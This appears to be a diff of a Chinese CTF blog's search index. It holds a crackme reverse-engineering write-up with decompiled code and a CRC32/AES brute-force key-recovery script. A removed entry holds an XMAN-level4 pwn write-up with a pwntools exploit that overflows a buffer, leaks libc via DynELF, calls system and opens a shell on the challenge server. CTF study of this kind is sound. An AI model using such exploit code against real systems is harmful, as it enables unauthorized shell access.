+  v43 = &apos;iaga&apos;;
+  v44 = &apos;!n&apos;;
+  v19 = v3;
+  v20 = v4;
+  v21 = 0;
+  v22 = v5;
+  v23 = v6;
+  v24 = v7;
+  v25 = 0;
+  if ( (unsigned __int8)(v2 - 65) &gt; 0x19u
+    || (unsigned __int8)(v3 - 65) &gt; 0x19u
+    || (unsigned __int8)(v4 - 65) &gt; 0x19u
+    || (unsigned __int8)(v5 - 65) &gt; 0x19u
+    || (unsigned __int8)(v6 - 65) &gt; 0x19u
+    || (unsigned __int8)(v7 - 65) &gt; 0x19u )
+  {
+    result = sub_4016D0(MultiByteStr);
+  }
+  else
+  {
+    v8 = CRC((int)&amp;v18, strlen(&amp;v18));
+    v9 = CRC((int)&amp;v22, strlen(&amp;v22));
+    sub_401490(&amp;WideCharStr, 30, L&quot;%08x%08x&quot;, v8, v9);
+    sub_401840(&amp;WideCharStr, &amp;v34);
+    sub_4016D0(MultiByteStr);
+    v10 = (char *)v1;
+    do
+      result = *v10++;
+    while ( result );
+    if ( !(((_BYTE)v10 - ((_BYTE)v1 + 1)) &amp; 0xF) )
+    {
+      v35 = 0x1020304;
+      v36 = 0x7080900;
+      v37 = 0xE0F0506;
+      v38 = 0xA0B0C0D;
+      sub_401380((_BYTE *)v1, (int)v27, strlen((const char *)v1), (int)&amp;v34, (int)&amp;v35);
+      v12 = 0;
+      if ( strlen((const char *)v1) )
+      {
+        v13 = &amp;WideCharStr;
+        do
+        {
+          sub_401490(v13, 3, L&quot;%02x&quot;, (unsigned __int8)v27[v12++]);
+          v13 += 2;
+        }
+        while ( v12 &lt; strlen((const char *)v1) );
+      }
+      sub_401840(&amp;WideCharStr, v27);
+      sub_401570(strlen(v27), (int)v27, v26);
+      v31 = &apos;=X7V&apos;;
+      _mm_storeu_si128((__m128i *)&amp;v28, _mm_loadu_si128((const __m128i *)&amp;xmmword_4034F4));
+      v32 = 0;
+      _mm_storeu_si128((__m128i *)&amp;v29, _mm_loadu_si128((const __m128i *)&amp;xmmword_403504));
+      _mm_storel_epi64((__m128i *)&amp;v30, _mm_loadl_epi64((const __m128i *)&amp;qword_403514));
+      memset(&amp;Dst, 0, 0x37u);
+      v14 = 0;
+      v15 = strlen((const char *)&amp;v28);
+      if ( v15 )
+      {
+        v16 = strlen(v26);
+        while ( v14 &lt; v16 )
+        {
+          if ( *((_BYTE *)&amp;v28 + v14) != v26[v14] )
+          {
+            v17 = MultiByteStr;
+            goto LABEL_19;
+          }
+          if ( ++v14 &gt;= v15 )
+            break;
+        }
+      }
+      v17 = v39;
+LABEL_19:
+      result = sub_4016D0(v17);
+    }
+  }
+  return result;
+}
+</code></pre><p>首先发现，成功和失败的提示被定义为字符串保存在函数中，程序运行之后才会出现。程序的大致流程是先将输入的前六位取出，判断是不是大写字母，如果不是就失败。</p>
+<p>之后将前六位分成两组，求其CRC32的校验码，CRC的算法如下：</p>
+<pre><code>uint crc32( uchar *buf, int len)
+{
+    uint ret = 0xFFFFFFFF;
+    int   i;
+    if( !init )
+    {
+         init_table();
+         init = 1;
+    }
+    for(i = 0; i &lt; len;i++)
+    {
+         ret = CRC32[((ret &amp; 0xFF) ^ buf[i])] ^ (ret &gt;&gt; 8);
+    }
+     ret = ~ret;
+    return ret;
+}
+</code></pre><p>CRC算法求解关键在于CRC表的生成，一般都是动态生成的，也可以静态定义，不过很麻烦。第一次求CRC初始的ret是-1，之后的ret就是上一次所求的CRC，以此原理将两部分的CRC转换为8位的16进制连接起来作为下面AES加密的密钥。</p>
+<p>加密之后的结果转换为16进制字符串，进行base64编码，与程序给出的XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=比较，base64转换过程中的置换表与平常的有些区别</p>
+<pre><code>0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/
+</code></pre><p>最终求正确的注册码必须要枚举密钥，反解AES然后比较解密结果的前六位与密钥是否一致，脚本如下：</p>
+<pre><code># _*_ coding:utf-8 _*_
+
+from Crypto.Cipher import AES
+import string
+from zlib import crc32
+
+def crack():
+    atable=&apos;0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/&apos;
+    btable=&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&apos;
+    base=&apos;XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=&apos;
+    transtab=string.maketrans(atable,btable)
+    iv=&apos;\x04\x03\x02\x01\x00\x09\x08\x07\x06\x05\x0f\x0e\x0d\x0c\x0b\x0a&apos;
+    table=list(string.uppercase)
+    c=base.translate(transtab).decode(&apos;base64&apos;).decode(&apos;hex&apos;)
+    count=0
+    for i1 in table:
+        for i2 in table:
+            for i3 in table:
+                for i4 in table:
+                    for i5 in table:
+                        for i6 in table:
+                            key=&apos;%08x&apos;%(crc32(i1+i2+i3)&amp;0xffffffff)+&apos;%08x&apos;%(crc32(i4+i5+i6)&amp;0xffffffff)
+                            crypto=AES.new(key,AES.MODE_CBC,iv)
+                            m=crypto.decrypt(c)
+                            count+=1
+                            if count%5000000==0:
+                                print count
+                            if m[:6]==i1+i2+i3+i4+i5+i6:
+                                print &apos;flag:&apos;+m
+                                return
+if __name__==&apos;__main__&apos;:
+    crack()
+</code></pre>]]></content>
       <tags>
         <tag>writeup</tag>
         <tag>reverse</tag>
@@ -3820,53 +3832,6 @@ void swap(int *a,int *b)
         <tag>ELF</tag>
         <tag>动态链接</tag>
         <tag>静态链接</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XMAN-level4</title>
-    <url>/2017/02/28/XMAN-level4/</url>
-    <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
-<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-</code></pre><p>也可以重新返回vuln：</p>
-<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
-</code></pre><p>脚本如下：</p>
-<pre><code>from pwn import *
-
-#p=process(&apos;./level4&apos;)
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
-level4=ELF(&apos;./level4&apos;)
-
-#plt
-write_plt=0x08048340
-read_plt=0x08048310
-
-#addr
-main=level4.symbols[&apos;main&apos;]
-basebss=level4.bss()
-pppr=0x08048509
-
-def leak(address):
-        payload=&apos;A&apos;*140
-    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-        p.send(payload)
-        data =p.recv(4)
-    print &quot;%#x %s&quot; % (address, data)
-        return data
-
-
-d = DynELF(leak, elf=ELF(&apos;./level4&apos;))
-
-system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
-log.success(&apos;leak system address: &apos; + hex(system_addr))
-
-payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
-p.send(payload2)
-p.send(&apos;/bin/sh\x00&apos;)
-p.interactive()
-</code></pre>]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
       </tags>
   </entry>
 </search>
